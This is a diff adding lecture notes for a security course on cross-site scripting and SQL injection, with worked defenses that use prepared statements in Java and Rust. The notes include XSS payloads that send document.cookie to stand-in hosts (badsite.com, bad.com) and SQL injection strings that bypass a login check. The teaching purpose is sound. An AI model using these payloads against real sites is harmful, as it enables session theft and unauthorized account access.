@@ -1,0 +1,188 @@
+---
+layout: ../../../layouts/SemesterMarkdown.astro
+---
+
+import { Image } from "astro:assets";
+import figure_9_6 from "@/images/security-book/figure-9.6.png";
+import figure_9_7 from "@/images/security-book/figure-9.7.png";
+
+# XSS and SQL injection
+
+## Questions on the readings
+
+The readings today are from
+[Computer Security and the Internet](https://people.scs.carleton.ca/~paulv/toolsjewels.html),
+[Chapter 9](https://people.scs.carleton.ca/~paulv/toolsjewels/TJrev1/ch9-rev1.pdf),
+sections 9.6, 9.7.
+
+## XSS: cross-site scripting
+
+- injecting malicious scripts into HTML tags or web pages
+
+  - rendering the HTML causes the script to be executed
+
+### Stored or persistent XSS
+
+```html
+Here is a picture of my dog <img id="mydogpic" src="dog.jpg" />
+<script>
+  document.getElementById("mydogpic").src =
+    "http://badsite.com/dog.jpg?arg1=" + document.cookie;
+</script>
+```
+
+- input from an attacker is stored on a website (e.g. in a database) without
+  being made safe to render and is then retrieved by the victim
+- possible on any site that allows users to upload content (e.g. social media,
+  discussion forums)
+- in the example above, the attacker changes the `src` attribute of the image to
+  be a URL that (a) goes to the attacker's site and (b) includes all of the
+  user's cookies for the original site
+- since images are loaded automatically, when a user visits a page with this
+  content, the browser will automatically send that user's cookies to the
+  attacker
+
+### Reflected (non-persistent) XSS
+
+```html
+Our favorite site for deals is www.good.com: <a href=’http://www.good.com/ <script>document.location="http://bad.com/dog.jpg?arg1="+document.cookie; </script>’> Click here </a>
+```
+
+- attacker input is immediately returned, e.g. in an error message or search
+  results, without the attacker input being made safe to render
+- the example above takes advantage of a site that returns 404 errors with
+  `File-not-found: filepath-requested`
+- when the user clicks the link, the browser will visit the URL and the good
+  site will return a 404 page:
+
+```html
+File-not-found:
+<script>
+  document.location="http://bad.com/
+  dog.jpg?arg1=" + document.cookie;
+</script>
+```
+
+- this sends the user to `bad.com`, and the attacker also gets the user's
+  cookies for the good site
+
+<Image src={figure_9_6} alt="XSS attacks" />
+
+### XSS impacts
+
+- once you allow an attacker to inject JavaScript, they can do a lot
+
+  - browser redirection
+  - access cookies
+  - access browser-stored data for a website
+  - rewrite the document being displayed
+  - exploit browser vulnerabilities
+
+### Defenses
+
+- sanitize input by removing tags
+  - a good framework (e.g. React, Vue) does this for you
+- sanitize output by using encoding, e.g. `&lt;` for left angle bracket
+- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+  - server can specify which domains are allowed to execute scripts
+
+## SQL Injection
+
+- why a vulnerability exists
+
+  - databases store information in tables
+  - scripts construct SQL queries
+  - scripts use input from cookies, variables, users
+
+- SQL injection
+
+  - crafting input so an attacker chooses an SQL command to be executed
+
+- attack types
+
+  - extracting data from the database
+  - modifying the database
+  - unauthorized account access
+  - denial of service
+
+<Image src={figure_9_7} alt="web architecture" />
+
+### Example attacks
+
+- imagine a server constructing a SQL query using input:
+
+```js
+query =
+  "SELECT * FROM pswdtab WHERE username=’" + un + "’ AND password=’" + pw + "’";
+```
+
+- normal use:
+
+```sql
+SELECT * FROM pswdtab WHERE username=’sam’ AND password=’abcde’
+```
+
+- attacker sends username = `“root’ --”`:
+
+```sql
+SELECT * FROM pswdtab WHERE username=’root’ -- AND···
+```
+
+- note, `--` indicates a comment, so the rest of the SQL statement is ignored
+
+- attacker sends username = ` “’OR 1=1 --”:
+
+```sql
+SELECT * FROM pswdtab WHERE username=’’ OR 1=1 --
+```
+
+- note, this provides an OR condition that is always true
+
+### Defenses
+
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+  recommends prepared statements
+
+  - prepare the query and then give variables to SQL database
+  - binding parameters to a SQL query will allow the database to automatically
+    handle escaping of characters
+
+- Java example:
+
+```java
+// This should REALLY be validated too
+String custname = request.getParameter("customerName");
+// Perform input validation to detect attacks
+String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
+PreparedStatement pstmt = connection.prepareStatement( query );
+pstmt.setString( 1, custname);
+ResultSet results = pstmt.executeQuery( );
+```
+
+- Rust example:
+
+```rust
+// Input from CLI args but could be anything
+let username = std::env::args().last().unwrap();
+
+// Using built-in macros (compile time checks)
+let users = sqlx::query_as!(
+        User,
+        "SELECT * FROM users WHERE name = ?",
+        username
+    )
+    .fetch_all(&pool)
+    .await
+    .unwrap();
+
+// Using built-in functions
+let users: Vec<User> = sqlx::query_as::<_, User>(
+        "SELECT * FROM users WHERE name = ?"
+    )
+    .bind(&username)
+    .fetch_all(&pool)
+    .await
+    .unwrap();
+```
+
+- can also use safely-constructed stored procedures, which are similar
